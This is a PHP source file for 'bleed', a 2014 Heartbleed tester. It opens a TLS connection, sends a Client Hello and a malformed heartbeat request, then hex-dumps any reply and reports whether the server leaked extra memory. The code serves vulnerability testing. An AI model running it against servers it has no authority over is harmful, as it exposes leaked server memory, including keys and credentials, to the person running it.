<?php

namespace bleed;

use bleed\Payload;
use Hoa\Socket;
use Clue\Hexdump\Hexdump;

/**
 * This class provides the functionality for the bleed application
 *
 * @copyright Copyright (C) 2014 Dominik Tobschall. All rights reserved.
 * @author Dominik Tobschall (http://tobschall.de/)
 */
class bleed
{
    private $host;

    private $port = 443;

    private $timeout = 5;

    private $socket;

    private $dumper;

    public function __construct($host, $port)
    {
        $this->host = $host;
        if($port) $this->port = $port;

        $this->init();
    }

    private function init()
    {
        $this->socket = new Socket\Client('tcp://' . $this->host . ':' . $this->port);
        $this->dumper = new Hexdump();
    }

    public function run()
    {
        $this->connect();

        echo "> Sending Client Hello" . PHP_EOL;
        $this->sendPayload(new Payload\Hello());
        $this->processHelloResponse();

        echo "> Sending Heartbeat request" . PHP_EOL;
        $this->sendPayload(new Payload\Heartbeat());
        $this->processHeartbeatResponse();
    }

    private function connect()
    {
        echo "> Connecting..." . PHP_EOL;
        $this->socket->connect();
        $this->socket->setStreamBlocking(0);
    }

    private function sendPayload($payload)
    {
        $this->socket->writeAll($payload->getPayload());
    }

    private function processHeartbeatResponse()
    {
        while(true) {
            list($type, $ver, $payload) = $this->getMessage();
            if(!$type) {
                echo "No heartbeat response. Server likely not vulnerable." . PHP_EOL;
                break;
            }

            if($type == 24) {
                echo "< Received heartbeat response" . PHP_EOL;
                $this->dump($payload);
                if(strlen($payload) > 3) {
                    echo "WARNING: Server returned more data than it should. Server is vulnerable!" . PHP_EOL;
                } else {
                    echo "Server processed malformed heartbeat, but did not return any extra data." . PHP_EOL;
                }
                break;
            }

            if($type == 21) {
                echo "< Received alert" . PHP_EOL;
                $this->dump($payload);
                echo "Server returned error, likely not vulnerable." . PHP_EOL;
                break;
            }
        }
    }

    private function processHelloResponse()
    {
        echo "  Waiting for Server Hello..." . PHP_EOL;

        while(true) {
            list($type, $ver, $payload) = $this->getMessage();
            if(!$type) {
                throw new \Exception("Server closed connection without sending Server Hello.");
            }

            if($type == 22 && hex2bin('0e') == substr($payload, 0,1)) {
                break;
            }
        }

    }

    private function getMessage()
    {
        if(!$header = $this->read(5)) {
            echo "Unexpected EOF receiving record header. Server closed connection." . PHP_EOL;
            return [false, false, false];
        }

        list($type, $ver, $len) = array_values(unpack('Ctype/nver/nlen', $header));

        if(!$payload = $this->read($len, 10)) {
            echo "Unexpected EOF receiving record payload. Server closed connection." . PHP_EOL;
            return [false, false, false];
        }

        printf('< Received message: type = %d, ver = %04x, length = %d' . PHP_EOL, $type, $ver, strlen($payload));

        return [$type, $ver, $payload];
    }

    private function read($len, $timeout = null)
    {
        if(!$timeout) {
            $timeout = $this->timeout;
        }
        $timeout = time() + $timeout;

        $this->socket->setStreamTimeout($timeout);

        $response = '';
        $rlen = $len;

        while($rlen > 0) {
            if(time() >= $timeout) {
                return false;
            }

            $data = $this->socket->read($rlen);
            if($this->socket->eof()) {
                return false;
            }

            $response .= $data;
            $rlen -= strlen($data);
        }

        return $response;
    }


    public function dump($data)
    {
        echo $this->dumper->dump($data);
    }


}
